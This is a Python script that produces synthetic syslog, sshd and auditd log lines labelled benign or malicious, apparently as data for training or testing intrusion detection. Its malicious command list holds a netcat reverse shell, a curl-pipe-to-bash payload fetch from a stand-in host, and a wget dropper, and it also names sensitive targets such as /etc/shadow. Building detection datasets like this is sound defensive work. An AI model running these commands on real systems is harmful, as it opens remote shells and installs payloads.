import random
from utils import (
    random_ip,
    random_user,
    timestamp_syslog,
    timestamp_epoch
)

HOSTNAME = ["server01", "server02", "web01", "db01", "laptop01", "laptop04"]
GOOD_RATIO = 0.65


def kernel_log():
    messages = [
        # benign
        "eth0: link up",
        "eth0: link down",
        "CPU frequency scaling enabled",
        "Disk sda mounted",
        "USB device connected",
        "Bluetooth: hci0 device initialized",
        "systemd-journald started",

        # warnings / critical
        "EXT4-fs error (device sda1)",
        "Kernel panic - not syncing",
        "Out of memory: Kill process",
        "thermal throttling activated",
        "watchdog: BUG: soft lockup"
    ]

    return (
        f"{timestamp_syslog()} {random.choice(HOSTNAME)} kernel: "
        f"{random.choice(messages)}"
    )


def auth_log(context):
    methods = ["password", "publickey", "keyboard-interactive"]
    pid = random.randint(1000, 9000)
    port = random.randint(1024, 65535)

    if context["malicious"]:
        return (
            f"{timestamp_syslog()} {random.choice(HOSTNAME)} sshd[{pid}]: "
            f"Failed {random.choice(methods)} for {context['user']} "
            f"from {context['ip']} port {port}"
        )

    return (
        f"{timestamp_syslog()} {random.choice(HOSTNAME)} sshd[{pid}]: "
        f"Accepted {random.choice(methods)} for {context['user']} "
        f"from {context['ip']} port {port}"
    )


def service_log():
    services = [
        "nginx",
        "apache2",
        "mysql",
        "docker",
        "ssh",
        "cron",
        "rsyslog",
        "network-manager",
        "postfix"
    ]

    actions = [
        "Started",
        "Stopped",
        "Restarted",
        "Reloaded",
        "Failed",
        "Scheduled restart job"
    ]

    return (
        f"{timestamp_syslog()} {random.choice(HOSTNAME)} systemd[1]: "
        f"{random.choice(actions)} {random.choice(services)}.service"
    )


def process_log(context):
    benign_cmds = [
        "python app.py",
        "curl http://example.com",
        "bash",
        "ls -la",
        "systemctl status ssh",
        "df -h",
        "uptime"
    ]

    malicious_cmds = [
        "nc -e /bin/sh 10.0.0.1 4444",
        "curl http://malicious.site/payload.sh | bash",
        "wget http://bad.site/dropper -O /tmp/a && chmod +x /tmp/a",
        "python -c 'import socket,os,pty'"
    ]

    cmd = random.choice(malicious_cmds if context["malicious"] else benign_cmds)

    return (
        f"type=EXECVE msg=audit({timestamp_epoch()}:{random.randint(100,999)}): "
        f"user={context['user']} cmd=\"{cmd}\""
    )


def filesystem_log(context):
    benign_paths = [
        "/var/log/syslog",
        "/etc/hosts",
        "/etc/resolv.conf",
        "/usr/share/doc",
        "/home/user1/.bashrc",
        "/opt/app/config.yaml"
    ]

    malicious_paths = [
        "/etc/shadow",
        "/etc/passwd",
        "/root/.ssh/authorized_keys",
        "/tmp/malware.sh",
        "/dev/shm/payload",
        "/var/tmp/.x"
    ]

    if context["malicious"]:
        return (
            f"type=PATH msg=audit({timestamp_epoch()}:{random.randint(100,999)}): "
            f"name=\"{random.choice(malicious_paths)}\" perm=\"w\" "
            f"user={context['user']}"
        )

    return (
        f"type=PATH msg=audit({timestamp_epoch()}:{random.randint(100,999)}): "
        f"name=\"{random.choice(benign_paths)}\" perm=\"r\" "
        f"user={context['user']}"
    )


def generate():
    context = {
        "ip": random_ip(),
        "user": random_user(),
        "malicious": random.random() > GOOD_RATIO
    }

    generators = [
        kernel_log,
        lambda: auth_log(context),
        service_log,
        lambda: process_log(context),
        lambda: filesystem_log(context)
    ]

    return random.choice(generators)()
